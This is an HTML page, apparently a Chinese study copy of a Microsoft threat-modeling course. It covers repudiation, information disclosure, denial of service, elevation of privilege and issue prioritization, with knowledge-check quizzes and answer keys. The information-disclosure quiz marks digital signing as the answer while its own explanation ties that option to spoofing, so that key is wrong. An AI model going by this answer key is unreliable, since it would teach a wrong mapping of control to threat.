srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="external-entity50"></td><td align="left">控制措施之外的过程、数据存储，甚至完全成熟的应用程序</td></tr><tr><td align="left">数据存储</td><td align="left"><img src="/img/thread-modeling/data-store50.png" class="lazyload" data-srcset="/img/thread-modeling/data-store50.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="data-store50"></td><td align="left">永久或临时的数据存储</td></tr></tbody></table><p>交互</p><table><thead><tr><th>名称</th><th align="left">交互</th><th align="left">定义</th></tr></thead><tbody><tr><td>过程 &lt;-&gt; 过程</td><td align="left"><img src="/img/thread-modeling/process-process.png" class="lazyload" data-srcset="/img/thread-modeling/process-process.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="process-process"></td><td align="left">一个任务从任务接收数据或向任务发送数据</td></tr><tr><td>过程 &lt;-&gt; 外部实体</td><td align="left"><img src="/img/thread-modeling/process-externalentity.png" class="lazyload" data-srcset="/img/thread-modeling/process-externalentity.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="process-externalentity"></td><td align="left">一个任务向用户发送数据或从用户接收数据</td></tr><tr><td>过程 &lt;-&gt; 数据存储</td><td align="left"><img src="/img/thread-modeling/process-datastore.png" class="lazyload" data-srcset="/img/thread-modeling/process-datastore.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="process-datastore"></td><td align="left">一个任务向数据存储发送数据或从数据存储接收数据</td></tr></tbody></table><h4 id="如何防止否认性攻击"><a href="#如何防止否认性攻击" class="headerlink" title="如何防止否认性攻击"></a>如何防止否认性攻击</h4><p>不可否认性通过创建和保护安全日志来确保每个操作都可以追溯到其来源。</p><h4 id="用于降低或消除风险的常用安全控制-2"><a href="#用于降低或消除风险的常用安全控制-2" class="headerlink" title="用于降低或消除风险的常用安全控制"></a>用于降低或消除风险的常用安全控制</h4><ul><li>强身份验证</li><li>安全日志记录和监视</li><li>数字签名</li><li>安全时间戳</li><li>受信任的第三方</li></ul><div class="note green"><p>推荐问题：是否可以将每个操作与身份绑定？</p></div><h4 id="知识检查-15"><a href="#知识检查-15" class="headerlink" title="知识检查"></a>知识检查</h4><ol><li>哪一条陈述描述了针对否认性的安全控制？</li></ol><div class='checkbox'><input type="radio" />            <p>A. 发送方对消息进行数字签名，以便接收方了解消息的来源。</p>            </div><div class='checkbox'><input type="radio" />            <p>B. 系统记录所有操作和用户，明确每个人的责任。</p>            </div><div class='checkbox'><input type="radio" />            <p>C. 系统为访问控制列表中列出的用户授予管理访问权限。</p>            </div><p>参考答案：<psw>== B ==</psw></p><p>解释：<psw>A. 此消息适用于欺骗。B. 这条陈述适用于否认性。C. 这条陈述适用于篡改、信息泄露、拒绝服务和权限提升。</psw></p><h3 id="信息泄漏-查看不应查看的数据"><a href="#信息泄漏-查看不应查看的数据" class="headerlink" title="信息泄漏 - 查看不应查看的数据"></a>信息泄漏 - 查看不应查看的数据</h3><p>向未经授权的个人公开敏感数据时，会发生信息泄漏。 无论是在有意或无意的情况下，都有可能发生信息泄露。</p><p>示例包括：</p><ul><li>系统通过错误消息泄露敏感数据</li><li>用户访问安全控制较弱的未授权文档和文件夹</li><li>用户访问流经非安全网络的数据</li></ul><h4 id="可能面临信息泄漏风险的元素和交互"><a href="#可能面临信息泄漏风险的元素和交互" class="headerlink" title="可能面临信息泄漏风险的元素和交互"></a>可能面临信息泄漏风险的元素和交互</h4><p>元素</p><table><thead><tr><th align="left">名称</th><th align="left">形状</th><th align="left">定义</th></tr></thead><tbody><tr><td align="left">过程</td><td align="left"><img src="/img/thread-modeling/process50.png" class="lazyload" data-srcset="/img/thread-modeling/process50.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="process50"></td><td align="left">修改输入或将输入重定向到输出的活动</td></tr><tr><td align="left">数据存储</td><td align="left"><img src="/img/thread-modeling/data-store50.png" class="lazyload" data-srcset="/img/thread-modeling/data-store50.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="data-store50"></td><td align="left">永久或临时的数据存储</td></tr><tr><td align="left">数据流</td><td align="left"><img src="/img/thread-modeling/data-flow50.png" class="lazyload" data-srcset="/img/thread-modeling/data-flow50.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="data-flow50"></td><td align="left">元素之间的数据移动</td></tr></tbody></table><p>交互</p><table><thead><tr><th align="left">名称</th><th align="left">交互</th><th align="left">定义</th></tr></thead><tbody><tr><td align="left">过程 &lt;-&gt; 过程</td><td align="left"><img src="/img/thread-modeling/process-process.png" class="lazyload" data-srcset="/img/thread-modeling/process-process.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="process-process"></td><td align="left">一个任务将数据发送到另一个任务</td></tr><tr><td align="left">过程 &lt;-&gt; 外部实体</td><td align="left"><img src="file:///Users/tari/Sites/TARI0510.github.io/source/img/thread-modeling/process-externalentity.png?lastModify=1617599435" class="lazyload" data-srcset="file:///Users/tari/Sites/TARI0510.github.io/source/img/thread-modeling/process-externalentity.png?lastModify=1617599435" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="process-externalentity"></td><td align="left">一个任务向用户发送数据或从用户接收数据</td></tr><tr><td align="left">过程 &lt;-&gt; 数据存储</td><td align="left"><img src="/img/thread-modeling/process-datastore.png" class="lazyload" data-srcset="/img/thread-modeling/process-datastore.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="process-datastore"></td><td align="left">一个任务向数据存储发送数据或从数据存储接收数据</td></tr><tr><td align="left">数据流 &lt;-&gt; 信任边界</td><td align="left"><img src="/img/thread-modeling/flow-trustboundary-7599331.png" class="lazyload" data-srcset="/img/thread-modeling/flow-trustboundary-7599331.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="flow-trustboundary"></td><td align="left">通过 Internet 将数据从受信任的环境传输给某人（反之亦然）</td></tr></tbody></table><h4 id="如何防止信息泄漏"><a href="#如何防止信息泄漏" class="headerlink" title="如何防止信息泄漏"></a>如何防止信息泄漏</h4><p>机密性确保数据受到保护。</p><p>示例包括：</p><ul><li>应用访问控制列表，以确保合适的用户可以访问适当的数据</li><li>加密静态数据、传输中数据和正在使用的数据</li><li>强制实施 SSL/TLS 以保护传输</li><li>使用 IPSec 隧道保护跨终结点的通信</li></ul><h4 id="用于降低或消除风险的常用安全控制-3"><a href="#用于降低或消除风险的常用安全控制-3" class="headerlink" title="用于降低或消除风险的常用安全控制"></a>用于降低或消除风险的常用安全控制</h4><ul><li>加密</li><li>访问控制列表 (ACL)</li></ul><div class="note green"><p>推荐问题：是否可以确保没有人能查看我的传输中的数据和静态数据？</p></div><h4 id="知识检查-16"><a href="#知识检查-16" class="headerlink" title="知识检查"></a>知识检查</h4><ol><li>哪一条陈述描述了针对信息泄漏的安全控制？</li></ol><div class='checkbox'><input type="radio" />            <p>A. 发送方对消息进行数字签名，以便接收方了解消息的来源。</p>            </div><div class='checkbox'><input type="radio" />            <p>B. 系统为访问控制列表中列出的用户授予管理访问权限。</p>            </div><div class='checkbox'><input type="radio" />            <p>C. 系统记录所有操作和用户，明确每个人的责任。</p>            </div><p>参考答案：<psw>== A ==</psw></p><p>解释：<psw>A. 此消息适用于欺骗。B. 这条陈述适用于篡改、信息泄露、拒绝服务和权限提升。C. 这条陈述适用于否认性。</psw></p><h3 id="拒绝服务-系统繁忙"><a href="#拒绝服务-系统繁忙" class="headerlink" title="拒绝服务 - 系统繁忙"></a>拒绝服务 - 系统繁忙</h3><p>当攻击者导致系统不可用时，将发生拒绝服务。</p><p>示例包括：</p><ul><li>向网络发送大量请求</li><li>占用内存和 CPU 进程</li><li>请求数量过多导致数据存储崩溃</li></ul><h4 id="可能面临拒绝服务风险的元素和交互"><a href="#可能面临拒绝服务风险的元素和交互" class="headerlink" title="可能面临拒绝服务风险的元素和交互"></a>可能面临拒绝服务风险的元素和交互</h4><p>元素</p><table><thead><tr><th align="left">名称</th><th align="left">形状</th><th align="left">定义</th></tr></thead><tbody><tr><td align="left">过程</td><td align="left"><img src="/img/thread-modeling/process50.png" class="lazyload" data-srcset="/img/thread-modeling/process50.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="process50"></td><td align="left">修改输入或将输入重定向到输出的活动</td></tr><tr><td align="left">数据存储</td><td align="left"><img src="/img/thread-modeling/data-store50.png" class="lazyload" data-srcset="/img/thread-modeling/data-store50.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="data-store50"></td><td align="left">永久或临时的数据存储</td></tr><tr><td align="left">数据流</td><td align="left"><img src="/img/thread-modeling/data-flow50.png" class="lazyload" data-srcset="/img/thread-modeling/data-flow50.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="data-flow50"></td><td align="left">元素之间的数据移动</td></tr></tbody></table><p>交互</p><table><thead><tr><th align="left">名称</th><th align="left">交互</th><th align="left">定义</th></tr></thead><tbody><tr><td align="left">过程 &lt;-&gt; 过程</td><td align="left"><img src="/img/thread-modeling/process-process.png" class="lazyload" data-srcset="/img/thread-modeling/process-process.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="process-process"></td><td align="left">一个任务将数据发送到另一个任务</td></tr><tr><td align="left">过程 &lt;-&gt; 外部实体</td><td align="left"><img src="file:///Users/tari/Sites/TARI0510.github.io/source/img/thread-modeling/process-externalentity.png?lastModify=1617599435" class="lazyload" data-srcset="file:///Users/tari/Sites/TARI0510.github.io/source/img/thread-modeling/process-externalentity.png?lastModify=1617599435" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="process-externalentity"></td><td align="left">一个任务向用户发送数据或从用户接收数据</td></tr><tr><td align="left">过程 &lt;-&gt; 数据存储</td><td align="left"><img src="/img/thread-modeling/process-datastore.png" class="lazyload" data-srcset="/img/thread-modeling/process-datastore.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="process-datastore"></td><td align="left">一个任务向数据存储发送数据或从数据存储接收数据</td></tr><tr><td align="left">数据流 &lt;-&gt; 信任边界</td><td align="left"><img src="/img/thread-modeling/flow-trustboundary-7599331.png" class="lazyload" data-srcset="/img/thread-modeling/flow-trustboundary-7599331.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="flow-trustboundary"></td><td align="left">通过 Internet 将数据从受信任的环境传输给某人（反之亦然）</td></tr></tbody></table><h4 id="如何防止拒绝服务"><a href="#如何防止拒绝服务" class="headerlink" title="如何防止拒绝服务"></a>如何防止拒绝服务</h4><p>可用性确保系统为用户启动且正常运行。 示例包括：</p><ul><li>使用网络访问控制列表控制传入和传出的流量</li><li>使用弹性资源管理不断增加或减少的使用量</li><li>监视系统以检测是否出现异常</li><li>启用操作系统标志来处理内存和 CPU 进程</li></ul><h4 id="用于降低或消除风险的常用安全控制-4"><a href="#用于降低或消除风险的常用安全控制-4" class="headerlink" title="用于降低或消除风险的常用安全控制"></a>用于降低或消除风险的常用安全控制</h4><ul><li>访问控制列表 (ACL)</li><li>筛选</li><li>配额</li><li>授权</li><li>高可用性</li></ul><div class="note green"><p>推荐问题：我的服务在某些地区是否会被限制资源？</p></div><h4 id="知识检查-17"><a href="#知识检查-17" class="headerlink" title="知识检查"></a>知识检查</h4><ol><li>哪一条陈述描述了针对拒绝服务的安全控制？</li></ol><div class='checkbox'><input type="radio" />            <p>A. 发送方对消息进行数字签名，以便接收方了解消息的来源。</p>            </div><div class='checkbox'><input type="radio" />            <p>B. 系统记录所有操作和用户，明确每个人的责任。</p>            </div><div class='checkbox'><input type="radio" />            <p>C. 系统依靠弹性资源来处理接收到的更多请求。</p>            </div><p>参考答案：<psw>== C ==</psw></p><p>解释：<psw>A. 此消息适用于欺骗。B. 这条陈述适用于否认性C. 这条陈述适用于拒绝服务。</psw></p><h3 id="权限提升-拥有本不应该有用的权限"><a href="#权限提升-拥有本不应该有用的权限" class="headerlink" title="权限提升 - 拥有本不应该有用的权限"></a>权限提升 - 拥有本不应该有用的权限</h3><p>个人未经许可访问资源时，就会发生权限提升。 示例包括：</p><ul><li>利用输入处理逻辑或内存中的弱点来提取数据</li><li>查找并使用特权帐户破坏服务（与欺骗和篡改威胁结合使用）</li></ul><h4 id="可能面临权限提升-风险的元素和交互"><a href="#可能面临权限提升-风险的元素和交互" class="headerlink" title="可能面临权限提升 风险的元素和交互"></a>可能面临权限提升 风险的元素和交互</h4><p>元素</p><table><thead><tr><th align="left">名称</th><th align="left">形状</th><th align="left">定义</th></tr></thead><tbody><tr><td align="left">过程</td><td align="left"><img src="/img/thread-modeling/process50.png" class="lazyload" data-srcset="/img/thread-modeling/process50.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="process50"></td><td align="left">修改输入或将输入重定向到输出的活动</td></tr></tbody></table><p>交互</p><table><thead><tr><th align="left">名称</th><th align="left">交互</th><th align="left">定义</th></tr></thead><tbody><tr><td align="left">过程 &lt;-&gt; 过程</td><td align="left"><img src="/img/thread-modeling/process-process.png" class="lazyload" data-srcset="/img/thread-modeling/process-process.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="process-process"></td><td align="left">一个任务将数据发送到另一个任务</td></tr><tr><td align="left">过程 &lt;-&gt; 外部实体</td><td align="left"><img src="/img/thread-modeling/process-externalentity.png" class="lazyload" data-srcset="/img/thread-modeling/process-externalentity.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="process-externalentity"></td><td align="left">任务接收来自用户的数据</td></tr><tr><td align="left">过程 &lt;-&gt; 数据存储</td><td align="left"><img src="/img/thread-modeling/process-datastore.png" class="lazyload" data-srcset="/img/thread-modeling/process-datastore.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="process-datastore"></td><td align="left">任务接收来自数据存储的数据</td></tr></tbody></table><h4 id="如何防止权限提升"><a href="#如何防止权限提升" class="headerlink" title="如何防止权限提升"></a>如何防止权限提升</h4><p>授权确保用户拥有适当的权限。 示例包括：</p><ul><li>实现授权机制以验证对数据和资源的权限</li><li>应用安全控制，以使用最少的访问权限运行服务</li><li>监视访问以检测异常和未经授权的访问尝试。</li></ul><h4 id="用于降低或消除风险的常用安全控制-5"><a href="#用于降低或消除风险的常用安全控制-5" class="headerlink" title="用于降低或消除风险的常用安全控制"></a>用于降低或消除风险的常用安全控制</h4><ul><li>访问控制列表 (ACL)</li><li>基于角色的访问控制 (RBAC)</li><li>基于组的访问</li><li>权限</li><li>输入验证</li></ul><div class="note green"><p>推荐问题：如何得知用户可以执行此操作？</p></div><h4 id="知识检查-18"><a href="#知识检查-18" class="headerlink" title="知识检查"></a>知识检查</h4><ol><li>哪一条陈述描述了针对权限提升的安全控制？</li></ol><div class='checkbox'><input type="radio" />            <p>A. 系统使用尽可能少的权限运行进程。</p>            </div><div class='checkbox'><input type="radio" />            <p>B. 发送方对消息进行数字签名，以便接收方了解消息的来源。</p>            </div><div class='checkbox'><input type="radio" />            <p>C. 系统记录所有操作和用户，明确每个人的责任。</p>            </div><p>参考答案：<psw>== A ==</psw></p><p>解释：<psw>A. 这条陈述适用于权限提升。B. 此消息适用于欺骗。C. 这条陈述适用于否认性。</psw></p><h3 id="小结-4"><a href="#小结-4" class="headerlink" title="小结"></a>小结</h3><h4 id="摘要-2"><a href="#摘要-2" class="headerlink" title="摘要"></a>摘要</h4><p>威胁建模框架可帮助你生成潜在威胁的列表，并找到降低或消除系统风险的方法。 了解每种威胁类别及其相应的安全控制。</p><p>本模块涵盖了以下内容：</p><ul><li>讨论了威胁建模框架中的每种威胁类别</li><li>了解了有助于降低或消除风险的安全控制</li></ul><div class="note green"><p>你知道吗？ 可以使用许多其他框架来实现不同的目标。 例如，渗透测试团队可将 LINDDUN 用于隐私威胁和攻击树。 攻击树有助于通过“假定违规”思维来确定攻击可能发生的方式。</p></div><h4 id="了解详细信息-1"><a href="#了解详细信息-1" class="headerlink" title="了解详细信息"></a>了解详细信息</h4><ul><li><a href="https://www.linddun.org/">LINDDUN</a> - 一种隐私威胁建模方法，支持分析人员系统地查找和解决软件体系结构中的隐私威胁。</li><li><a href="https://www.microsoft.com/security/blog/2016/11/28/disrupting-the-kill-chain/">网络终止链</a> - 介绍典型的工作流，包括攻击者用于渗入组织网络和系统的技术、策略和过程。</li><li>补上一个微软安全博客 （ <a href="https://www.microsoft.com/security/blog/">https://www.microsoft.com/security/blog/</a></li></ul><h2 id="模块6-设置问题的优先级并应用安全控制措施"><a href="#模块6-设置问题的优先级并应用安全控制措施" class="headerlink" title="模块6 | 设置问题的优先级并应用安全控制措施"></a>模块6 | 设置问题的优先级并应用安全控制措施</h2><h3 id="介绍-2"><a href="#介绍-2" class="headerlink" title="介绍"></a>介绍</h3><p>威胁建模框架可以帮助你生成威胁列表和降低风险的方法，但不会为你确定其优先级。</p><p>此外，它不会基于安全控制措施的类型和功能提供分层建议，因此更难确定要实现哪些控制措施。</p><h4 id="确实问题的优先级"><a href="#确实问题的优先级" class="headerlink" title="确实问题的优先级"></a>确实问题的优先级</h4><p>确定问题的优先级是威胁建模中一个重要的部分。 在资源有限的情况下，它可以帮助将资源分配给最关键的问题。</p><p>示例包括：</p><ul><li>必须选择是要实现记录所有管理操作的功能，还是使用 SSL/TLS 对流量进行加密</li><li>确定是先实现访问控制列表，还是先增强系统的输入验证过程</li></ul><h4 id="何时设置优先级"><a href="#何时设置优先级" class="headerlink" title="何时设置优先级"></a>何时设置优先级</h4><p>根据每个问题的风险因素对其指定优先级。 此外，选择可与其他措施联用的安全控制措施，可帮助为你的系统提供分层安全保护机制。</p><p>此过程可能需要一段时间才能完成。 还需要同事和安全团队的帮助。 请留出足够的时间来与其协作。</p><h4 id="学习目标-5"><a href="#学习目标-5" class="headerlink" title="学习目标"></a>学习目标</h4><p>在本模块中，你将能够：</p><ul><li>对问题分配优先级</li><li>对安全控制进行分类</li><li>了解每个安全控制措施类型和功能</li></ul><div class="note success"><p>无必备知识即可学习 （</p></div><h3 id="问题优先级、安全控制措施类型和功能"><a href="#问题优先级、安全控制措施类型和功能" class="headerlink" title="问题优先级、安全控制措施类型和功能"></a>问题优先级、安全控制措施类型和功能</h3><p>威胁建模练习可帮助你发现一些问题，有时还会有意想不到的收获。 缺少优先级可能会让工程师感到不知所措，无法确定要首先解决哪些问题。</p><h4 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h4><p>首先，确定问题对于系统的重要程度。 然后，<u>选择有利于以最低的成本提供最大程度保护的安全控制措施</u>。</p><h4 id="确定安全问题的优先级"><a href="#确定安全问题的优先级" class="headerlink" title="确定安全问题的优先级"></a>确定安全问题的优先级</h4><p>根据风险严重性来确定安全问题的优先级。 各组织的标签可能不同。 但通常会根据威胁被攻击者利用时带来的风险影响，以从严重到低风险的模式设置优先级标签。</p><h4 id="类型和功能"><a href="#类型和功能" class="headerlink" title="类型和功能"></a>类型和功能</h4><p>安全控制具有不同的类型和功能。</p><p>有三个主要的类别可帮助你关注安全性的三种形式。</p><p>示例包括：</p><ul><li>物理：摄像头、徽章和围栏</li><li>技术：加密、虚拟防火墙和防病毒软件</li><li>管理：策略、法规和书面要求</li></ul><p>功能的意义在于针对潜在威胁每个阶段帮助保护系统。</p><p>示例包括：</p><ul><li>用锁防止入侵</li><li>安装摄像头来检测入侵</li><li>制定入侵响应计划</li><li>修复由入侵导致的破坏</li><li>使用标志和其他安全控制措施防患于未然</li></ul><p>在接下来的几个单元中，我们将了解优先级、类型和功能。</p><h3 id="设置安全问题的优先级"><a href="#设置安全问题的优先级" class="headerlink" title="设置安全问题的优先级"></a>设置安全问题的优先级</h3><p>生成包含降低或消除风险的方法的威胁列表。 然后，与同事合作分配优先级。</p><h4 id="选择优先级框架"><a href="#选择优先级框架" class="headerlink" title="选择优先级框架"></a>选择优先级框架</h4><p>优先级练习应遵循组织创建的内部安全 bug 栏。</p><p>Microsoft 工程师使用的内部 bug 栏类似于下表，供你参考：</p><p>Microsoft 工程师使用的内部 bug 栏类似于下表，供你参考：</p><table><thead><tr><th align="left">图标</th><th align="left">严重性</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left"><img src="/img/thread-modeling/critical.png" class="lazyload" data-srcset="/img/thread-modeling/critical.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="critical"></td><td align="left">严重</td><td align="left">可能会对系统用户造成严重影响。 示例包括涉及敏感信息泄漏的行为和需要隐私和法律参与的威胁</td></tr><tr><td align="left"><img src="/img/thread-modeling/important.png" class="lazyload" data-srcset="/img/thread-modeling/important.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="important"></td><td align="left">重要说明</td><td align="left">可能会对系统用户造成严重影响。 示例包括在没有已知的解决方法时显示系统不可用</td></tr><tr><td align="left"><img src="/img/thread-modeling/moderate.png" class="lazyload" data-srcset="/img/thread-modeling/moderate.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="moderate"></td><td align="left">适中</td><td align="left">可能对系统用户造成中等程度的影响。 